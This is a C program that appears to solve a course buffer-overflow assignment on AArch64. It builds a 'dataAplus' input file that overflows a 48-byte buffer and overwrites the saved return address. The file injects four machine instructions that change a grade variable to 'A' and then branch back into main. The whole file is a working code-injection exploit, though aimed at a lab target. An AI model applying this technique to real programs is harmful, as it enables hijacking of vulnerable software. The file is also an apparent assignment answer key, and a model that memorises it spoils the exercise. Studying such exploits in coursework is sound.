#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "miniassembler.h"




int main() {
    FILE *pFileAplus;
    unsigned int instruction;
    /* address to overwrite getName's saved x30 on stack */
    unsigned char auiReturnAddr[8];
    /* format string for printf -> 17 chars */
    static const char acFmt[] = "A+ is your grade.";
    /* Student name to write to file  */
    char name[] = "Zara\0";
    /* Name string length + null byte: 5 bytes */
    size_t nameLen;
    /* address where format string will be name start + nameLen */
    unsigned long ulFormatAddr;
    /* Calculate where instructions will start: format + sizeof(acFmt) + 2 nulls */
    unsigned long ulCodeAddr;
    /* Align to 4 bytes: 0x420071 % 4 = 1, so need 3 bytes padding */
    size_t alignmentPadding;
    char* padding;
    /* Calculate padding: buffer(48) - name(5) - format(18) - 2 nulls(2) - alignment(3) - instructions(16) */
    size_t instructionBytes;
    size_t totalDataBytes;
    size_t paddingLen;
    unsigned char nullByte;
    size_t i;
    
    /* Initialize variables */
    nameLen = strlen(name) + 1;
    ulFormatAddr = 0x420058 + nameLen;  /* 0x42005D */
    /* sizeof(acFmt) = 18 bytes (17 chars + null), so format ends at 0x42006E */
    /* Then 2 nulls: 0x42006F, 0x420070 */
    /* Instructions should start at 0x420071, but need 4-byte alignment */
    ulCodeAddr = ulFormatAddr + sizeof(acFmt) + 2;  /* 0x420071 */
    alignmentPadding = 0;
    if (ulCodeAddr % 4 != 0) {
        alignmentPadding = 4 - (ulCodeAddr % 4);
        ulCodeAddr += alignmentPadding;  /* Now 0x420074, aligned */
    }
    /* Instructions: 4 instructions * 4 bytes = 16 bytes */
    instructionBytes = 4 * 4;
    totalDataBytes = nameLen + sizeof(acFmt) + 2 + alignmentPadding + instructionBytes;
    paddingLen = 48 - totalDataBytes;
    nullByte = 0x00;


    pFileAplus = fopen("dataAplus", "wb");
    if (pFileAplus == NULL) {
        perror("Failed to open dataAplus");
        return EXIT_FAILURE;
    }
    fwrite(name, 1, nameLen, pFileAplus);
    fwrite(acFmt, 1, sizeof(acFmt), pFileAplus);
    /* temp terminator ( gets overwritten with newline)*/
    fputc(0x00, pFileAplus);
    /* real terminator */
    fputc(0x00, pFileAplus);
    
    /* Add alignment padding to ensure instructions are 4-byte aligned */
    for (i = 0; i < alignmentPadding; i++) {
        fputc(nullByte, pFileAplus);
    }


    /*
    */
   
    /* Write machine code instructions that will be executed */
    /* These will be copied to BSS starting at ulCodeAddr (0x420074, aligned) */
    
    /* Instruction 1: adr x0, address of grade variable (0x420044) */
    /* This loads the address of the grade variable into x0 */
    instruction = MiniAssembler_adr(0, 0x420044, ulCodeAddr);
    fwrite(&instruction, sizeof(instruction), 1, pFileAplus);
    
    /* Instruction 2: mov w1, 'A' */
    /* This instruction moves the ASCII value of 'A' (0x41) into register w1 */
    instruction = MiniAssembler_mov(1, 'A');
    fwrite(&instruction, sizeof(instruction), 1, pFileAplus);
    
    /* Instruction 3: strb w1, [x0] */
    /* This instruction stores the byte in w1 to the address in x0 (grade variable) */
    instruction = MiniAssembler_strb(1, 0);
    fwrite(&instruction, sizeof(instruction), 1, pFileAplus);
    
    /* Instruction 4: b 0x40089c (back to main, right before printf) */
    /* This instruction branches back to main to continue normal execution */
    instruction = MiniAssembler_b(0x40089c, ulCodeAddr + 12);
    fwrite(&instruction, sizeof(instruction), 1, pFileAplus);

    /* Add padding bytes to fill the remaining buffer space */
    padding = (char *)calloc(paddingLen, 1);
    if (padding == NULL)
    {
       perror("Memory allocation failed");
       fclose(pFileAplus);
       return EXIT_FAILURE;
    }
    /* fill padding with P bytes for visibility */
    memset(padding, 'P', paddingLen);
    fwrite(padding, 1, paddingLen, pFileAplus);
    free(padding);


    memcpy(auiReturnAddr, &ulCodeAddr, sizeof(ulCodeAddr));
    /* Write address of instructions in BSS to overwrite x30 */
    fwrite(auiReturnAddr, 1, 8, pFileAplus);
    /*Close file */
    fclose(pFileAplus);
    return EXIT_SUCCESS;


}
